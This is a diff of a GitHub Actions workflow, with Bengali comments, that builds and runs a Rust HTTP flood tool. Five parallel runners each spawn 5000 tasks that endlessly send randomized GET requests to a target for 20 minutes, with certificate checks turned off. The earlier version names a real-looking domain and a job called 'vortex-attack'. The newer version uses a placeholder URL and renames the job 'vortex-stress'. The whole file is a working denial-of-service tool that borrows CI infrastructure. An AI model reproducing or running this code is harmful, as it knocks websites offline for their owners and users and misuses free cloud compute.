@@ -1,25 +1,28 @@
-name: Vortex Matrix Cloud Engine
+name: Vortex Matrix Final
 on: 
-  workflow_dispatch: # তুমি ম্যানুয়ালি রান করবে
+  workflow_dispatch:
 
 jobs:
-  vortex-attack:
+  vortex-stress:
     runs-on: ubuntu-latest
     strategy:
-      fail-fast: false # একটি মেশিন ফেইল করলে বাকিগুলো বন্ধ হবে না
+      fail-fast: false
       matrix:
-        instance: [1, 2, 3, 4, 5] # এখানে ৫টি মেশিন সেট করা আছে। চাইলে সংখ্যা বাড়াতে পারো (১০ বা ১৫)
+        instance: [1, 2, 3, 4, 5] # ৫টি মেশিন একসাথে চলবে
 
     steps:
       - name: Checkout Code
         uses: actions/checkout@v3
 
-      - name: Auto-Build Rust Engine
+      - name: Setup and Run
         run: |
-          cargo new vortex_matrix --bin
-          cd vortex_matrix
+          # ১. প্রজেক্ট তৈরি
+          cargo new vortex_cloud --bin
+          cd vortex_cloud
+          
+          # ২. লাইব্রেরি সেটআপ
           echo '[package]
-          name = "vortex_matrix"
+          name = "vortex_cloud"
           version = "0.1.0"
           edition = "2021"
           [dependencies]
@@ -27,36 +30,36 @@ jobs:
           reqwest = { version = "0.11", features = ["rustls-tls"] }
           rand = "0.8"' > Cargo.toml
           
+          # ৩. মেইন কোড (একদম থ্রেড-সেফ ভার্সন)
           echo 'use reqwest::Client;
           use std::time::Duration;
-          use rand::Rng;
+
           #[tokio::main]
           async fn main() {
-              let target = "https://www.ninjahex.com/"; // জিহাদ, এখানে লিংক দাও
+              let target = "http://YOUR_TARGET_URL"; // জিহাদ, এখানে তোমার লিংক দাও
               let client = Client::builder()
                   .danger_accept_invalid_certs(true)
                   .build().unwrap();
-              println!("🚀 Instance No: ${{ matrix.instance }} is Firing!");
+              
+              println!("🚀 Machine ${{ matrix.instance }} is Active!");
               
               let mut handles = vec![];
               for _ in 0..5000 {
                   let client_ref = client.clone();
                   let target_ref = target.to_string();
+                  
                   handles.push(tokio::spawn(async move {
-                      let mut rng = rand::thread_rng();
                       loop {
-                          let random_id: u64 = rng.gen();
-                          let url = format!("{}?vortex={}", target_ref, random_id);
+                          // thread_rng() বাদ দিয়ে সরাসরি random() ব্যবহার
+                          let r: u64 = rand::random(); 
+                          let url = format!("{}?vortex={}", target_ref, r);
                           let _ = client_ref.get(&url).send().await;
                       }
                   }));
               }
-              // ২০ মিনিট পর অটোমেটিক বন্ধ হওয়ার জন্য সেফটি টাইমার
+              // ২০ মিনিট পর অটো-স্টপ
               tokio::time::sleep(Duration::from_secs(1200)).await;
-              println!("🛑 Timer complete. Shutting down.");
           }' > src/main.rs
 
-      - name: Execute High-Speed Load
-        run: |
-          cd vortex_matrix
+          # ৪. কম্পাইল ও রান
           cargo run --release
